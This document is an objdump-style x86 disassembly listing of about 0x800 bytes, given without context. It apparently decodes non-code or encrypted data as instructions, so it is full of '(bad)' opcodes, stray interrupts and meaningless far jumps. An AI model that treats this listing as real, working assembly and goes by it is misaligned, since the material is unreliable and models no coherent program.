  422bcc:	int    0x8d
  422bce:	mov    ch,0x4
  422bd0:	cli    
  422bd1:	test   BYTE PTR [edx-0x61783f79],al
  422bd7:	int    0xe6
  422bd9:	jge    0x422bae
  422bdb:	xacquire xchg BYTE PTR [ebx],dh
  422bde:	ins    DWORD PTR es:[edi],dx
  422bdf:	ins    BYTE PTR es:[edi],dx
  422be0:	shr    BYTE PTR [eax+ebp*4-0x31],0x65
  422be5:	outs   dx,DWORD PTR ds:[esi]
  422be6:	lods   al,BYTE PTR ds:[esi]
  422be7:	xchg   DWORD PTR [eax-0x42ef3280],eax
  422bed:	inc    esp
  422bee:	add    DWORD PTR [eax+0x337dcd80],0xaf4820f
  422bf8:	lea    edi,[ebp+0x4a58d0a]
  422bfe:	cli    
  422bff:	test   BYTE PTR [edx+0x402cd77],al
  422c05:	mov    dh,0xa5
  422c07:	and    ebx,0xa58d04ef
  422c0d:	xchg   edx,eax
  422c0e:	mov    es,WORD PTR [edx+edi*8]
  422c11:	dec    esi
  422c12:	ja     0x422c32
  422c14:	pop    ebp
  422c15:	rcl    DWORD PTR [edx-0x2ccc7f80],1
  422c1b:	int    0xf
  422c1d:	fidiv  DWORD PTR [esi-0x5a89785b]
  422c23:	jecxz  0x422bd2
  422c25:	xchg   DWORD PTR [esi+0x7d],esi
  422c28:	or     dh,BYTE PTR [esi+0xd]
  422c2b:	in     al,dx
  422c2c:	inc    esi
  422c2d:	add    al,0xef
  422c2f:	test   BYTE PTR [ebp-0x7f7f7fc9],bh
  422c35:	jecxz  0x422c23
  422c37:	jecxz  0x422bef
  422c39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c3a:	pop    esi
  422c3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c3c:	lods   eax,DWORD PTR ds:[esi]
  422c3d:	add    BYTE PTR [esi+0x3ea57600],0xa6
  422c44:	lods   eax,DWORD PTR ds:[esi]
  422c45:	mov    ss,esi
  422c47:	mov    ebp,0x8086745d
  422c4c:	add    BYTE PTR [edi+0x760a7d76],0xd
  422c53:	shl    DWORD PTR [esi-0x7b3f7b5b],cl
  422c59:	test   al,0x33
  422c5b:	add    BYTE PTR [edx-0x33],bh
  422c5e:	leave  
  422c5f:	int    0xc6
  422c61:	or     eax,0x808059bd
  422c66:	cmp    BYTE PTR ds:0x8987d481,0xe6
  422c6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c6e:	jecxz  0x422c59
  422c70:	mov    ss,esi
  422c72:	in     eax,dx
  422c73:	in     al,dx
  422c74:	add    BYTE PTR [eax],0x76
  422c77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c78:	int    0x8d
  422c7a:	mov    ch,0x4
  422c7c:	rcl    DWORD PTR [edx-0x32021933],cl
  422c82:	leave  
  422c83:	xor    esi,DWORD PTR [esi+0x34]
  422c86:	pop    esi
  422c87:	jbe    0x422c2e
  422c89:	jnp    0x422c15
  422c8b:	int    0xf8
  422c8d:	xor    edx,esi
  422c8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c90:	int    0x96
  422c92:	cmp    al,0x45
  422c94:	inc    ecx
  422c95:	inc    ebx
  422c96:	add    esi,DWORD PTR [edi-0x79]
  422c99:	jle    0x422c71
  422c9b:	clc    
  422c9c:	or     ah,dh
  422c9e:	std    
  422c9f:	das    
  422ca0:	pop    ecx
  422ca1:	adc    DWORD PTR [ebx-0x1a],eax
  422ca4:	cmp    al,0x2f
  422ca6:	or     esp,DWORD PTR [edx-0x2]
  422ca9:	add    BYTE PTR [eax],al
  422cab:	mov    ebp,0x80808040
  422cb0:	xor    ebp,DWORD PTR [ebp-0x31]
  422cb3:	les    esi,FWORD PTR [esp+eiz*2]
  422cb6:	int    0x96
  422cb8:	sub    al,0xcd
  422cba:	(bad)  
  422cbb:	stc    
  422cbc:	xor    edx,esi
  422cbe:	sbb    al,0xa
  422cc0:	inc    edx
  422cc1:	int    0x96
  422cc3:	inc    esp
  422cc4:	int    0xe6
  422cc6:	std    
  422cc7:	xor    esp,esi
  422cc9:	xor    al,0xa
  422ccb:	pusha  
  422ccc:	retf   
  422ccd:	arpl   WORD PTR [eax-0x7fdb2d56],bp
  422cd3:	test   al,0x9c
  422cd5:	xor    ebp,DWORD PTR [ebp+0x6c]
  422cd8:	in     al,dx
  422cd9:	popf   
  422cda:	adc    bh,ah
  422cdc:	add    BYTE PTR [eax-0x7e7d7e80],0xc5
  422ce3:	shl    ebp,cl
  422ce5:	mov    BYTE PTR [eax+0x43f9d6cd],bl
  422ceb:	(bad)  
  422cec:	and    al,0x77
  422cee:	mov    ch,0xcd
  422cf0:	jbe    0x422c9f
  422cf2:	shr    DWORD PTR [ebp+0x760a4588],cl
  422cf8:	lods   eax,DWORD PTR ds:[esi]
  422cf9:	or     dl,dh
  422cfb:	stc    
  422cfc:	test   al,0xc5
  422cfe:	int    0x8d
  422d00:	jne    0x422d31
  422d02:	pop    ecx
  422d03:	ins    DWORD PTR es:[edi],dx
  422d04:	shl    edx,cl
  422d06:	test   BYTE PTR [edi-0x2c78428a],al
  422d0c:	in     al,dx
  422d0d:	xchg   BYTE PTR [edi],ch
  422d0f:	pop    ecx
  422d10:	ins    DWORD PTR es:[edi],dx
  422d11:	xchg   DWORD PTR [esi+0x75],esi
  422d14:	int    0xc6
  422d16:	jge    0x422ce7
  422d18:	les    esi,FWORD PTR [esi-0x80]
  422d1b:	xor    ebp,DWORD PTR [ebp-0x31]
  422d1e:	les    esi,FWORD PTR [esi-0x80]
  422d21:	adc    bh,ah
  422d23:	add    BYTE PTR [eax+0x24778180],0xcd
  422d2a:	mov    WORD PTR [esp+ebx*2],?
  422d2d:	shl    DWORD PTR [esp+esi*1-0x73bc77d4],cl
  422d34:	xor    al,0xa4
  422d36:	ja     0x422d5d
  422d38:	retf   0x31
  422d3b:	je     0x422d71
  422d3d:	pop    esp
  422d3e:	shl    ebp,cl
  422d40:	mov    BYTE PTR [ecx],cl
  422d42:	xchg   esp,eax
  422d43:	xor    al,0x2c
  422d45:	int    0xc
  422d47:	das    
  422d48:	mov    ebx,0xebd38096
  422d4d:	push   ebx
  422d4e:	das    
  422d4f:	rcl    DWORD PTR [ebx],1
  422d51:	pop    esi
  422d52:	mov    WORD PTR [esp+ebp*1],?
  422d55:	ja     0x422d71
  422d57:	int    0xdb
  422d59:	pop    edi
  422d5a:	or     BYTE PTR [eax+0x13338080],0xd3
  422d61:	jmp    0x422ce8
  422d63:	mov    eax,0x87808d81
  422d68:	ins    DWORD PTR es:[edi],dx
  422d69:	iret   
  422d6a:	les    esi,FWORD PTR [esp+ebp*2]
  422d6d:	(bad)
  422d70:	test   DWORD PTR [esi],edi
  422d72:	mov    WORD PTR [esp+ebp*1],?
  422d75:	xor    ebx,ebx
  422d77:	mov    eax,0x8780963e
  422d7c:	ins    DWORD PTR es:[edi],dx
  422d7d:	add    al,0x6d
  422d7f:	or     edi,0xc56c34c4
  422d85:	cwde   
  422d86:	int    0xf0
  422d88:	mov    ebp,0xfcd9
  422d8d:	int    0xd9
  422d8f:	int    0xf
  422d91:	jns    0x422d19
  422d93:	mov    bh,0xbd
  422d95:	sub    esp,edi
  422d97:	add    BYTE PTR [eax],al
  422d99:	cwde   
  422d9a:	int    0xf0
  422d9c:	jns    0x422e16
  422d9e:	test   DWORD PTR [ebx+0xfc6bbd],esp
  422da4:	add    BYTE PTR [eax-0x58798787],bl
  422daa:	mov    ebp,0xfc38
  422daf:	jns    0x422e29
  422db1:	xchg   edx,eax
  422db2:	cmp    eax,0xeceb99cd
  422db7:	add    eax,DWORD PTR [eax]
  422db9:	add    BYTE PTR [esi-0x12ed1233],dl
  422dbf:	inc    esp
  422dc0:	add    DWORD PTR [eax-0x6893680],0x35862149
  422dca:	leave  
  422dcb:	jbe    0x422d82
  422dcd:	inc    ecx
  422dce:	and    DWORD PTR [esi-0x778932cb],eax
  422dd4:	or     dh,BYTE PTR [esi-0x78]
  422dd7:	int    0x76
  422dd9:	stc    
  422dda:	int    0x96
  422ddc:	stc    
  422ddd:	pop    ebx
  422dde:	cwde   
  422ddf:	call   0xd3e3:0x3b9effc0
  422de6:	jmp    0x3586:0x21d1bf28
  422ded:	cmp    eax,ebp
  422def:	sar    DWORD PTR [ebp+0xad25392],cl
  422df5:	jbe    0x422e6c
  422df7:	int    0x76
  422df9:	stc    
  422dfa:	int    0x96
  422dfc:	stc    
  422dfd:	cmp    eax,ebp
  422dff:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e05:	jmp    0xfd76:0xad25328
  422e0c:	int    0x76
  422e0e:	stc    
  422e0f:	int    0x96
  422e11:	stc    
  422e12:	cmp    eax,ebp
  422e14:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e1a:	jmp    0xd076:0xad25328
  422e21:	int    0x76
  422e23:	stc    
  422e24:	int    0x96
  422e26:	stc    
  422e27:	cmp    eax,ebp
  422e29:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e2f:	jmp    0xbd76:0xad25328
  422e36:	leave  
  422e37:	jbe    0x422e66
  422e39:	dec    ecx
  422e3a:	and    DWORD PTR [ebp+esi*1+0x496576c9],eax
  422e41:	mov    al,ds:0x76c93586
  422e46:	and    eax,0x35862169
  422e4b:	sar    BYTE PTR [esp+ebx*4],0xa
  422e4f:	jbe    0x422e21
  422e51:	or     dh,BYTE PTR [esi-0x30]
  422e54:	sar    BYTE PTR [esp+ebx*4+0xad0760a],0x76
  422e5c:	ror    cl,1
  422e5e:	jbe    0x422e30
  422e60:	jo     0x422de2
  422e62:	add    BYTE PTR [eax+0x78d076c9],0x80
  422e69:	add    BYTE PTR [eax-0x32068933],0x96
  422e70:	stc    
  422e71:	cmp    eax,ebp
  422e73:	cmp    esp,ebx
  422e75:	sar    DWORD PTR [ebp+0x28ead392],cl
  422e7b:	push   ebx
  422e7c:	ror    BYTE PTR [edx],cl
  422e7e:	jbe    0x422e50
  422e80:	int    0x76
  422e82:	stc    
  422e83:	int    0x96
  422e85:	stc    
  422e86:	cmp    eax,ebp
  422e88:	cmp    esp,ebx
  422e8a:	sar    DWORD PTR [ebp+0x28ead392],cl
  422e90:	push   ebx
  422e91:	ror    BYTE PTR [edx],cl
  422e93:	jbe    0x422e65
  422e95:	leave  
  422e96:	jbe    0x422e2d
  422e98:	arpl   WORD PTR [edx+0x76c98080],dx
  422e9e:	lods   eax,DWORD PTR ds:[esi]
  422e9f:	pop    esi
  422ea0:	add    BYTE PTR [eax+0xd76c980],0xe6
  422ea7:	add    BYTE PTR [eax-0xa983080],0xff
  422eae:	add    BYTE PTR [eax],al
  422eb0:	iret   
  422eb1:	push   edi
  422eb2:	xchg   ebp,eax
  422eb3:	inc    DWORD PTR [eax]
  422eb5:	add    BYTE PTR [ebp+0xff13],bh
  422ebb:	add    BYTE PTR [ebp+0xf3d60d],cl
  422ec1:	lea    ebp,[ebp-0x72ff562a]
  422ec7:	xchg   ebp,eax
  422ec8:	(bad)  
  422ec9:	fcmove st,st(1)
  422ecb:	jbe    0x422e7a
  422ecd:	dec    esi
  422ece:	ins    BYTE PTR es:[edi],dx
  422ecf:	add    BYTE PTR [eax-0x32068933],0x8d
  422ed6:	stc    
  422ed7:	cmp    eax,ebp
  422ed9:	sar    DWORD PTR [ebp-0x57003f6e],cl
  422edf:	cmp    ecx,DWORD PTR [edi]
  422ee1:	shl    edx,cl
  422ee3:	sub    BYTE PTR [ebx-0x2d],dl
  422ee6:	or     dh,BYTE PTR [esi+0x6d]
  422ee9:	int    0x76
  422eeb:	stc    
  422eec:	int    0x8d
  422eee:	stc    
  422eef:	add    al,0xb6
  422ef1:	cmc    
  422ef2:	cmp    BYTE PTR [ebx],0xc5
  422ef5:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  422efb:	repnz sub BYTE PTR [ebx-0x2d],dl
  422eff:	or     dh,BYTE PTR [esi-0x6b]
  422f02:	mov    ah,0xb1
  422f04:	sbb    al,0x80
  422f06:	add    BYTE PTR [eax-0x320a89f6],0x6c
  422f0d:	push   eax
  422f0e:	or     dh,BYTE PTR [esi-0x13]
  422f11:	int    0x6c
  422f13:	dec    esp
  422f14:	or     dh,BYTE PTR [esi+0x11]
  422f17:	int    0x76
  422f19:	mov    bh,cl
  422f1b:	(bad)  
  422f1c:	cmc    
  422f1d:	or     cl,BYTE PTR [ecx]
  422f1f:	rol    BYTE PTR [ecx+0x76cd8080],1
  422f25:	mov    bh,cl
  422f27:	(bad)  
  422f28:	in     eax,dx
  422f29:	or     cl,BYTE PTR [ecx]
  422f2b:	push   ebp
  422f2c:	add    DWORD PTR [eax-0x77893280],0xcf88d600
  422f36:	lea    edx,[ecx]
  422f38:	or     cl,BYTE PTR [ecx]
  422f3a:	pop    ebp
  422f3b:	add    DWORD PTR [eax+0x3eccbd80],0x8dcd8080
  422f45:	stc    
  422f46:	int    0x96
  422f48:	stc    
  422f49:	cmp    ecx,DWORD PTR [ebx+edi*1]
  422f4c:	cdq    
  422f4d:	shr    ebx,cl
  422f4f:	xchg   edx,eax
  422f50:	shr    edx,cl
  422f52:	sub    BYTE PTR [ebx+0x13],dl
  422f55:	inc    ebx
  422f56:	jge    0x422f87
  422f58:	add    eax,0x808087ca
  422f5d:	int    0x76
  422f5f:	mov    ch,cl
  422f61:	add    DWORD PTR ds:0xcd808081,esi
  422f67:	mov    ch,cl
  422f69:	jbe    0x422ef3
  422f6b:	int    0x1
  422f6d:	xor    eax,0xcd808081
  422f72:	add    BYTE PTR [edi-0x72329b92],0x88
  422f79:	int    0xa
  422f7b:	adc    DWORD PTR [ecx+0x17cf8080],eax
  422f81:	adc    al,0x0
  422f83:	add    BYTE PTR [eax],al
  422f85:	(bad)  
  422f86:	int    0x96
  422f88:	mov    ch,cl
  422f8a:	mov    ds:0x80808125,al
  422f8f:	int    0x22
  422f91:	xchg   DWORD PTR [eax-0x7f7f7ff7],esi
  422f97:	rol    BYTE PTR [eax+eax*1-0x7f7f3330],0x80
  422f9f:	bound  eax,QWORD PTR [eax]
  422fa1:	jno    0x422fc7
  422fa3:	cmp    ebp,DWORD PTR [ebp-0x37]
  422fa6:	push   es
  422fa7:	push   esp
  422fa8:	add    BYTE PTR [eax],al
  422faa:	add    BYTE PTR [esi],cl
  422fac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fad:	aad    0x49
  422faf:	leave  
  422fb0:	push   es
  422fb1:	pop    esp
  422fb2:	add    BYTE PTR [eax],al
  422fb4:	add    BYTE PTR [edi+0x35],dl
  422fb7:	adc    ebp,DWORD PTR [ebx+0x6406c9]
  422fbd:	add    BYTE PTR [eax],al
  422fbf:	mov    ds:0x79d735c1,eax
  422fc4:	push   es
  422fc5:	ins    BYTE PTR es:[edi],dx
  422fc6:	add    BYTE PTR [eax],al
  422fc8:	add    BYTE PTR [eax],bl
  422fca:	iret   
  422fcb:	outs   dx,BYTE PTR ds:[si]
  422fcd:	add    BYTE PTR [eax],al
  422fcf:	add    BYTE PTR [edi+0x3b41afb8],ch
  422fd5:	ins    DWORD PTR es:[edi],dx
  422fd6:	leave  
  422fd7:	push   es
  422fd8:	sub    al,0x0
  422fda:	add    BYTE PTR [eax],al
  422fdc:	push   cs
  422fdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fde:	aad    0x49
  422fe0:	leave  
  422fe1:	push   es
  422fe2:	xor    al,0x0
  422fe4:	add    BYTE PTR [eax],al
  422fe6:	push   edi
  422fe7:	xor    eax,0x6c9ab13
  422fec:	cmp    al,0x0
  422fee:	add    BYTE PTR [eax],al
  422ff0:	mov    ds:0x79c335c1,eax
  422ff5:	push   es
  422ff6:	inc    esp
  422ff7:	add    BYTE PTR [eax],al
  422ff9:	add    BYTE PTR [eax],bl
  422ffb:	iret   
  422ffc:	addr16 inc esi
  422ffe:	add    BYTE PTR [eax],al
  423000:	add    BYTE PTR [edi-0x32be5048],ch
  423006:	jbe    0x422f90
  423008:	int    0x1
  42300a:	adc    DWORD PTR [ecx-0x19327f80],eax
  423010:	mov    BYTE PTR [ebp*2+0x35760a30],al
  423017:	int    0x76
  423019:	mov    ch,cl
  42301b:	add    DWORD PTR [ebp-0x7f],edi
  42301e:	add    BYTE PTR [eax+0x410176c9],0xa7
  423025:	mov    dl,0x35
  423027:	leave  
  423028:	jbe    0x42302f
  42302a:	mov    bh,0x3f
  42302c:	cmp    DWORD PTR [edi-0x48],eax
  42302f:	leave  
  423030:	jbe    0x42303b
  423032:	xlat   BYTE PTR ds:[ebx]
  423033:	sbb    cl,cl
  423035:	push   es
  423036:	les    eax,FWORD PTR [eax]
  423038:	add    BYTE PTR [eax],al
  42303a:	push   cs
  42303b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42303c:	aad    0x49
  42303e:	leave  
  42303f:	push   es
  423040:	nop
  423041:	add    BYTE PTR [eax],al
  423043:	add    BYTE PTR [edi+0x35],dl
  423046:	xlat   BYTE PTR ds:[ebx]
  423047:	inc    ecx
  423048:	leave  
  423049:	push   es
  42304a:	aam    0x0
  42304c:	add    BYTE PTR [eax],al
  42304e:	cmp    DWORD PTR [ecx+0x57],ecx
  423051:	jge    0x42301c
  423053:	push   es
  423054:	fadd   QWORD PTR [eax]
  423056:	add    BYTE PTR [eax],al
  423058:	mov    cl,0x3f
  42305a:	shl    DWORD PTR ds:0xe406c9,0x0
  423061:	add    BYTE PTR [edi-0x49],al
  423064:	xlat   BYTE PTR ds:[ebx]
  423065:	sbb    cl,cl
  423067:	push   es
  423068:	pushf  
  423069:	add    BYTE PTR [eax],al
  42306b:	add    BYTE PTR [esi],cl
  42306d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42306e:	aad    0x49
  423070:	leave  
  423071:	push   es
  423072:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423073:	add    BYTE PTR [eax],al
  423075:	add    BYTE PTR [edi+0x35],dl
  423078:	xlat   BYTE PTR ds:[ebx]
  423079:	inc    ecx
  42307a:	leave  
  42307b:	push   es
  42307c:	lods   al,BYTE PTR ds:[esi]
  42307d:	add    BYTE PTR [eax],al
  42307f:	add    BYTE PTR [ecx],bh
  423081:	dec    ecx
  423082:	push   edi
  423083:	jge    0x42304e
  423085:	push   es
  423086:	mov    ah,0x0
  423088:	add    BYTE PTR [eax],al
  42308a:	mov    cl,0x3f
  42308c:	shl    DWORD PTR ds:0xbc06c9,0x0
  423093:	add    BYTE PTR [edi-0x49],al
  423096:	ret    
  423097:	sbb    BYTE PTR [ebp-0x7f7fc39d],bh
  42309d:	jo     0x42306c
  42309f:	jbe    0x4230d6
  4230a1:	add    BYTE PTR [eax],dh
  4230a3:	int    0x76
  4230a5:	stc    
  4230a6:	int    0x8d
  4230a8:	stc    
  4230a9:	cmp    eax,ebp
  4230ab:	cmp    ecx,DWORD PTR [edi]
  4230ad:	shl    edx,cl
  4230af:	sub    bl,dl
  4230b1:	mov    ebp,0xcdd35392
  4230b6:	lea    ebp,[ebp+0x52fd343]
  4230bc:	test   BYTE PTR [ecx+0x76cd8080],0xb5
  4230c3:	int    0x8d
  4230c5:	mov    ch,0x3b
  4230c7:	lds    edi,FWORD PTR [ebx]
  4230c9:	psrlq  mm6,mm2
  4230cc:	sub    bl,dl
  4230ce:	mov    ebp,0xcdd35392
  4230d3:	lea    ebp,[ebp+0x76cd7d33]
  4230d9:	ins    DWORD PTR es:[edi],dx
  4230da:	inc    ebx
  4230db:	shr    DWORD PTR [edi],cl
  4230dd:	or     ch,dl
  4230df:	add    DWORD PTR [eax+0x3d76c980],0x80808080
  4230e9:	int    0x76
  4230eb:	mov    ch,cl
  4230ed:	rcl    BYTE PTR [ecx],1
  4230ef:	add    DWORD PTR [eax-0x77193280],0xcd8876cd
  4230f9:	add    DWORD PTR [ebp-0x7f],esi
  4230fc:	add    BYTE PTR [eax-0x7fc50943],0x80
  423103:	jo     0x423105
  423105:	cwde   
  423106:	xor    ch,cl
  423108:	lea    ecx,[eax-0x7ebaf533]
  42310e:	add    BYTE PTR [eax+0x76cd810a],0x88
  423115:	int    0x5d
  423117:	adc    DWORD PTR [ecx-0x29327f80],eax
  42311d:	mov    BYTE PTR [ebx],bh
  42311f:	ins    DWORD PTR es:[edi],dx
  423120:	iret   
  423121:	pop    ss
  423122:	pushf  
  423123:	add    BYTE PTR [eax],al
  423125:	add    BYTE PTR [ebp-0x7f7fc36e],bh
  42312b:	jo     0x4230fa
  42312d:	jbe    0x4230b7
  42312f:	int    0x1
  423131:	inc    ebp
  423132:	add    DWORD PTR [eax+0x500080],0x760a889a
  42313c:	adc    eax,0xcd8876cd
  423141:	pop    ebp
  423142:	adc    DWORD PTR [ecx-0x29327f80],eax
  423148:	mov    BYTE PTR [ebx],bh
  42314a:	ins    DWORD PTR es:[edi],dx
  42314b:	iret   
  42314c:	pop    ss
  42314d:	les    eax,FWORD PTR [eax]
  42314f:	add    BYTE PTR [eax],al
  423151:	mov    ebp,0x80803ad9
  423156:	jo     0x423125
  423158:	jbe    0x4230e2
  42315a:	int    0x1
  42315c:	inc    ebp
  42315d:	add    DWORD PTR [eax+0x500080],0x76cd889a
  423167:	mov    ch,cl
  423169:	pop    ebp
  42316a:	adc    DWORD PTR [ecx-0x29327f80],eax
  423170:	mov    BYTE PTR [ebx],bh
  423172:	ins    DWORD PTR es:[edi],dx
  423173:	iret   
  423174:	pop    ss
  423175:	push   esp
  423176:	add    BYTE PTR [eax],al
  423178:	add    BYTE PTR [ebp-0x7f7fc52f],bh
  42317e:	jo     0x42314d
  423180:	jbe    0x42310a
  423182:	int    0x1
  423184:	inc    ebp
  423185:	add    DWORD PTR [eax+0x500080],0xb604889a
  42318f:	pop    ebp
  423190:	or     BYTE PTR [edx],0x76
  423193:	xor    eax,0xc05d76cd
  423198:	push   ds
  423199:	cmp    ebx,edx
  42319b:	sahf   
  42319c:	clc    
  42319d:	add    al,BYTE PTR [ecx]
  42319f:	shr    BYTE PTR [esi+0x2f],cl
  4231a2:	pop    ecx
  4231a3:	shl    BYTE PTR [eax+0x0],cl
  4231a6:	xchg   esi,eax
  4231a7:	xor    eax,0x43d66d06
  4231ac:	int    0x76
  4231ae:	pop    ebp
  4231af:	add    al,0xad
  4231b1:	mov    eax,DWORD PTR [ebp*2-0x69ff8faf]
  4231b8:	adc    eax,0x40d46d06
  4231bd:	int    0x76
  4231bf:	mov    ch,cl
  4231c1:	pop    ebp
  4231c2:	adc    DWORD PTR [ecx-0x29327f80],eax
  4231c8:	mov    BYTE PTR [ebx],bh
  4231ca:	ins    DWORD PTR es:[edi],dx
  4231cb:	iret   
  4231cc:	xchg   esi,eax
  4231cd:	add    DWORD PTR [ebp-0x7f7fc560],edi
  4231d3:	jo     0x4231a2
  4231d5:	jbe    0x42315f
  4231d7:	int    0x1
  4231d9:	cmp    eax,0x808081
  4231de:	push   eax
  4231df:	add    BYTE PTR [edx+0xd760a88],bl
  4231e5:	in     al,dx
  4231e6:	test   BYTE PTR [esi+esi*4],al
  4231e9:	or     eax,0x5d760080
  4231ee:	add    al,0xe6
  4231f0:	pop    ebp
  4231f1:	sub    al,0x82
  4231f3:	sub    eax,0xcdb576cd
  4231f8:	lea    esi,[ebp-0x3f772933]
  4231fe:	jmp    FWORD PTR [edx-0xfc43ac5]
  423204:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42320a:	push   ebx
  42320b:	ror    edi,cl
  42320d:	pop    ss
  42320e:	cmc    
  42320f:	inc    DWORD PTR [eax]
  423211:	add    BYTE PTR [ebp-0x7f7fc5e8],bh
  423217:	jo     0x4231e6
  423219:	jbe    0x423214
  42321b:	int    0x8d
  42321d:	stc    
  42321e:	int    0xd6
  423220:	mov    BYTE PTR [ebx],bh
  423222:	lds    edi,FWORD PTR [ebx]
  423224:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42322b:	push   ebx
  42322c:	ror    edi,cl
  42322e:	pop    ss
  42322f:	xchg   ebp,eax
  423230:	inc    DWORD PTR [eax]
  423232:	add    BYTE PTR [ebp-0x7f7fc70a],bh
  423238:	jo     0x42323a
  42323a:	xchg   esi,eax
  42323b:	or     eax,0xcdf98dcd
  423240:	xchg   esi,eax
  423241:	stc    
  423242:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423245:	(bad)  
  423247:	jmp    0x4231db
  423249:	shr    edx,cl
  42324b:	sub    BYTE PTR [ebx+0x13],dl
  42324e:	inc    ebx
  42324f:	jge    0x423227
  423251:	mov    ecx,ecx
  423253:	jbe    0x423292
  423255:	add    DWORD PTR [eax+0x76cd8080],0xb58dcdb5
  42325f:	cmp    eax,ebp
  423261:	sar    DWORD PTR [ebp-0x2c0fc46e],cl
  423267:	repnz sub BYTE PTR [ebx-0x2d],dl
  42326b:	xchg   DWORD PTR [esi+0x6d],esi
  42326e:	or     dh,BYTE PTR [esi+0x6d]
  423271:	int    0x76
  423273:	cmp    eax,0x1cd46d06
  423278:	int    0x76
  42327a:	mov    ch,0xcd
  42327c:	lea    esi,[ebp-0xfc43ac5]
  423282:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423288:	push   ebx
  423289:	rol    DWORD PTR [edi+0x760a9576],cl
  42328f:	xchg   ebp,eax
  423290:	int    0x76
  423292:	mov    ch,0xcd
  423294:	lea    esi,[ebp-0xfc43ac5]
  42329a:	shl    edx,cl
  42329c:	sub    bl,dl
  42329e:	mov    ebp,0xcdd35392
  4232a3:	lea    ebp,[ebp+0x76cd7d33]
  4232a9:	ins    DWORD PTR es:[edi],dx
  4232aa:	inc    ebx
  4232ab:	shr    DWORD PTR [edi],cl
  4232ad:	pop    es
  4232ae:	push   eax
  4232af:	inc    DWORD PTR [eax]
  4232b1:	add    al,al
  4232b3:	jmp    FWORD PTR [eax-0x326a8933]
  4232b9:	lea    ebp,[ebp+0x43]
  4232bc:	jge    0x423294
  4232be:	xor    DWORD PTR [eax],eax
  4232c0:	(bad)  
  4232c1:	mov    bh,cl
  4232c3:	jbe    0x4232c2
  4232c5:	jo     0x423284
  4232c7:	stc    
  4232c8:	jl     0x42324a
  4232ca:	or     BYTE PTR [edx],0x76
  4232cd:	jne    0x4232bb
  4232cf:	sbb    cl,ch
  4232d1:	jbe    0x423348
  4232d3:	int    0x8d
  4232d5:	mov    ch,0xcd
  4232d7:	xchg   esi,eax
  4232d8:	mov    ch,0x3b
  4232da:	or     al,0x3b
  4232dc:	cdq    
  4232dd:	shr    ebx,cl
  4232df:	xchg   edx,eax
  4232e0:	shr    edx,cl
  4232e2:	sub    BYTE PTR [ebx+0x13],dl
  4232e5:	push   ecx
  4232e6:	mov    ch,cl
  4232e8:	jbe    0x4232e3
  4232ea:	int    0x8d
  4232ec:	stc    
  4232ed:	cmp    eax,ebp
  4232ef:	cmp    ecx,DWORD PTR [edi]
  4232f1:	shl    edx,cl
  4232f3:	sub    bl,dl
  4232f5:	mov    ebp,0xcdd35392
  4232fa:	lea    esi,[ebp+0x43]
  4232fd:	shr    DWORD PTR [edi],cl
  4232ff:	add    eax,0x80805300
  423304:	int    0x76
  423306:	stc    
  423307:	int    0x8d
  423309:	stc    
  42330a:	cmp    eax,ebp
  42330c:	cmp    ecx,DWORD PTR [edi]
  42330e:	shl    edx,cl
  423310:	sub    bl,dl
  423312:	mov    ebp,0xcdd35392
  423317:	(bad)  
  423318:	std    
  423319:	inc    ebx
  42331a:	shr    DWORD PTR [edi],cl
  42331c:	add    eax,0x808053ea
  423321:	int    0x76
  423323:	stc    
  423324:	int    0x8d
  423326:	stc    
  423327:	cmp    eax,ebp
  423329:	cmp    ecx,DWORD PTR [edi]
  42332b:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423331:	push   ebx
  423332:	shr    esp,cl
  423334:	adc    al,0xcd
  423336:	lea    esi,[ebp+0x3bb596cd]
  42333c:	or     al,0x3b
  42333e:	cdq    
  42333f:	shr    ebx,cl
  423341:	xchg   edx,eax
  423342:	shr    edx,cl
  423344:	sub    BYTE PTR [ebx+0x13],dl
  423347:	xchg   ebx,edx
  423349:	int    0x8d
  42334b:	std    
  42334c:	inc    ebx
  42334d:	rol    DWORD PTR [edx-0x2893219],cl
  423353:	or     dh,BYTE PTR [esi-0x53]
  423356:	int    0x76
  423358:	jne    0x423364
  42335a:	jbe    0x42332c
  42335c:	ret    
  42335d:	dec    ecx
  42335e:	and    DWORD PTR [esi+0x45e60a35],eax
  423364:	leave  
  423365:	jbe    0x423304
  423367:	inc    ecx
  423368:	and    DWORD PTR [esi+0x4576cd35],eax
  42336e:	int    0x8d
  423370:	inc    ebp
  423371:	cmp    eax,ebp
  423373:	cmp    ecx,DWORD PTR [edi]
  423375:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42337b:	push   ebx
  42337c:	ror    DWORD PTR [edx],cl
  42337e:	jbe    0x4233d5
  423380:	int    0x76
  423382:	inc    ebp
  423383:	int    0x8d
  423385:	inc    ebp
  423386:	cmp    eax,ebp
  423388:	cmp    ecx,DWORD PTR [edi]
  42338a:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423390:	push   ebx
  423391:	ror    DWORD PTR [edx],cl
  423393:	jbe    0x42332a
  423395:	leave  
  423396:	jbe    0x4233d5
  423398:	dec    eax
  423399:	and    DWORD PTR [esi+0x1d76c935],eax
  42339f:	ret    0x8621
  4233a2:	xor    eax,0xcd4576cd
  4233a7:	lea    eax,[ebp+0x3b]
  4233aa:	lds    edi,FWORD PTR [ebx]
  4233ac:	psrlq  mm6,mm2
  4233af:	sub    bl,dl
  4233b1:	mov    ebp,0xcdd35392
  4233b6:	lea    ebp,[ebp+0x52f7d43]
  4233bc:	push   ss
  4233bd:	xchg   DWORD PTR [eax-0x6d241480],eax
